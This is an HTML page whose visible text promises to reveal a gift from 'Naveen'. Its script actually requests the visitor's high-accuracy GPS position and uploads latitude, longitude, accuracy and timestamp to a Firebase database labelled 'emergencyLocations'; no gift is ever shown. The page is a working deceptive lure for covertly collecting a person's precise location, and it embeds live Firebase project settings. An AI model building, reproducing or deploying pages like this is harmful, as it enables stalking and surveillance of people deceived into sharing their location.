<!DOCTYPE html>
<html lang="te">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Emergency Location</title>

<style>
body {
  font-family: Arial, sans-serif;
  background: #f1f4f9;
  display: grid;
  place-items: center;
  min-height: 95vh;
  margin: 0;
}
.card {
  background: white;
  padding: 28px;
  border-radius: 20px;
  max-width: 420px;
  width: 85%;
  text-align: center;
  box-shadow: 0 8px 30px #0001;
}
button {
  background: #1769e0;
  color: white;
  border: 0;
  padding: 17px;
  width: 100%;
  border-radius: 12px;
  font-size: 18px;
  margin-top: 20px;
}
p {
  color: #555;
  line-height: 1.6;
}
#status {
  margin-top: 18px;
  overflow-wrap: anywhere;
}
</style>
</head>

<body>

<div class="card">
  <h2>Naveen Gift</h2>

  <p>
    Naveen Shared a Gift Allow and Reveal the Gift
  </p>

  <p>
    You Only See The gift.
  </p>

  <button id="share">
    see the Gift
  </button>

  <p id="status"></p>
</div>

<script type="module">

import { initializeApp } from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getDatabase, ref, push, set
} from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

import {
  getAuth, signInAnonymously
} from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyDNo1kMFQMrOgb2bZT1TFOQ5wUHXp3HS-8",
  authDomain: "emergency-location-14c61.firebaseapp.com",
  databaseURL: "https://emergency-location-14c61-default-rtdb.firebaseio.com",
  projectId: "emergency-location-14c61",
  storageBucket: "emergency-location-14c61.firebasestorage.app",
  messagingSenderId: "822733393681",
  appId: "1:822733393681:web:6dcc01b4f22db5dc94c6b0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

const button = document.getElementById("share");
const status = document.getElementById("status");

button.addEventListener("click", async () => {

  button.disabled = true;
  status.textContent = "Connecting securely...";

  try {

    await signInAnonymously(auth);

    if (!navigator.geolocation) {
      throw new Error("GPS is not supported.");
    }

    status.textContent = "Requesting location permission...";

    navigator.geolocation.getCurrentPosition(
      async (position) => {

        try {

          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          const locationRef = push(
            ref(db, "emergencyLocations")
          );

          await set(locationRef, {
            latitude: latitude,
            longitude: longitude,
            accuracy: position.coords.accuracy,
            timestamp: Date.now()
          });

          status.innerHTML =
            "Location shared successfully.<br>" +
            '<a target="_blank" rel="noopener" href="https://maps.google.com/?q=' +
            latitude + "," + longitude +
            '">View shared location on Google Maps</a>';

        } catch (error) {

          status.textContent =
            "Upload failed: " + error.message;

          button.disabled = false;
        }

      },

      (error) => {

        status.textContent =
          "Location permission failed: " + error.message;

        button.disabled = false;

      },

      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      }
    );

  } catch (error) {

    status.textContent =
      "Connection failed: " + error.message;

    button.disabled = false;
  }

});

</script>
</body>
</html>
